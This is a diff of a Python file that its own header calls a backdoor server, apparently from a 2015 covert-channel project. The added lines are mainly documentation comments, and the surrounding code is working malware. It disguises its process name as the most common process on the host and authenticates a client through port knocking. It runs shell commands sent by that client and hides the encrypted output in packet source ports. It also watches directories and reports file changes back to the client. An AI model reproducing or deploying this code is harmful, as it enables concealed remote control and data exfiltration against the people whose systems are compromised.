@@ -1,4 +1,30 @@
 #!/usr/bin/python
+
+#-----------------------------------------------------------------------------
+#-- SOURCE FILE:    server.py -   server (Backdoor) for client
+#--
+#-- FUNCTIONS:      checkRoot()
+#--                 setProcessName(name)
+#--                 maskProcess()
+#--                 knock(packet)
+#--                 shellCommand(packet, command)
+#--                 watchAdd(path, ip)
+#--                 watchRemove()
+#--                 screenshot()
+#--                 exit()
+#--                 parseCommand(packet)
+#--                 main()
+#--
+#-- DATE:           November 29, 2015
+#--
+#-- PROGRAMMERS:    Brij Shah & Callum Styan
+#--
+#-- NOTES:
+#-- A multi-protocol backdoor which masks its process name and listens for
+#-- commands from the client. It can execute shell commands as well as 
+#-- monitor directories for file changes to send back to the client.
+#-----------------------------------------------------------------------------
+
 import setproctitle, encryption, configfile, helpers, os, sys, logging
 from multiprocessing import Process
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
@@ -12,19 +38,41 @@ state = 0
 observer = Observer()
 watch= ''
 clientIP = ""
-# unauthClients = {}
-# authedClients = {}
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       checkRoot()
+#--
+#-- NOTES:
+#-- Checks the uid running the application. If its not root, exit.
+#-----------------------------------------------------------------------------
 def checkRoot():
     if(os.getuid() != 0):
         sys.exit("This program must be run with root. Try Again..")
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       setProcessName(name)
+#--
+#-- VARIABLES(S):   name - process name to be changed
+#--
+#-- NOTES:
+#-- setProcessName uses 'prctl' to manipulate certain characteristics
+#-- of a process. It takes in a name in which you want to assign to the
+#-- scripts process and changes it within the buffer.
+#-----------------------------------------------------------------------------
 def setProcessName(name):
     libc = cdll.LoadLibrary('libc.so.6')
     buff = create_string_buffer(len(name) + 1)
     buff.value = name
     libc.prctl(15, byref(buff), 0, 0, 0)
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       maskProcess()
+#--
+#-- NOTES:
+#-- maskProcess obtains the most common process for both ps -aux and top and
+#-- calls setProcessName to set the script process name to the most common
+#-- process running on the system at the time.
+#-----------------------------------------------------------------------------
 def maskProcess():
     command = os.popen("ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
     commandResult = command.read()
@@ -35,6 +83,15 @@ def maskProcess():
     setProcessName(commandResult)
     #print "Most common process for top: {0}".format(commandResult)
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       knock(packet)
+#--
+#-- VARIABLES(S):   packet - packet passed in by sniff
+#--
+#-- NOTES:
+#-- maintains the state of an IP address trying to authenticate. Checks for
+#-- three correct knocks, else it will not authenticate client.
+#-----------------------------------------------------------------------------
 def knock(packet):
     global state
     global clientIP
@@ -56,6 +113,18 @@ def knock(packet):
             else:
                 print "Wrong sequence, state = 0"
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       shellCommand(packet, command)
+#--
+#-- VARIABLES(S):   packet - the packet passed in by sniff
+#---                command - the shell command to run
+#--
+#-- NOTES:
+#-- runs the specified command and proceeds to encrypted the output. The output
+#-- is then split up in to chunks and passed into create packets accordingly
+#-- the data is converted into decimal and embedded into the source port.
+#-- Finally, it sends the packet.
+#-----------------------------------------------------------------------------
 def shellCommand(packet, command):
     print "Running command " + command
     ip = packet[IP].src
@@ -76,6 +145,15 @@ def shellCommand(packet, command):
         send(packet, verbose=0)
         time.sleep(0.1)
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       watchAdd(path, ip)
+#--
+#-- VARIABLES(S):   path - the file directory path
+#--                 ip - IP address to send watch to
+#--
+#-- NOTES:
+#-- 
+#-----------------------------------------------------------------------------
 def watchAdd(path, ip):
     watch = observer.schedule(FileWatch(ip,configfile.protocol, configfile.password, configfile.masterkey), path)
     observer.start()
@@ -93,15 +171,44 @@ def watchAdd(path, ip):
     except KeyboardInterrupt:
         observer.stop()
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       watchRemove()
+#--
+#-- NOTES:
+#-- 
+#-----------------------------------------------------------------------------
 def watchRemove():
     observer.unschedule(watch)
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       screenshot(packet, command)
+#--
+#-- VARIABLES(S):   packet - the packet passed in by sniff
+#--                 command - the command to run
+#--
+#-- NOTES:
+#-- 
+#-----------------------------------------------------------------------------
 def screenshot(packet, command):
     print "screenshot"
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       exit()
+#--
+#-- NOTES:
+#-- 
+#-----------------------------------------------------------------------------
 def exit():
     print "exit"
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       parseCommand(packet)
+#--
+#-- VARIABLES(S):   packet - the packet passed in by sniff
+#--
+#-- NOTES:
+#-- 
+#-----------------------------------------------------------------------------
 def parseCommand(packet):
     if packet.haslayer(IP) and packet.haslayer(Raw):
         if packet[IP].src != clientIP:
@@ -125,9 +232,14 @@ def parseCommand(packet):
             elif commandType == 'exit':
                 exit()
             else:
-                # terrible
                 print "Unknown command"
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       main()
+#--
+#-- NOTES:
+#-- The pseudomain method.
+#-----------------------------------------------------------------------------
 def main():
     maskProcess()
     checkRoot()
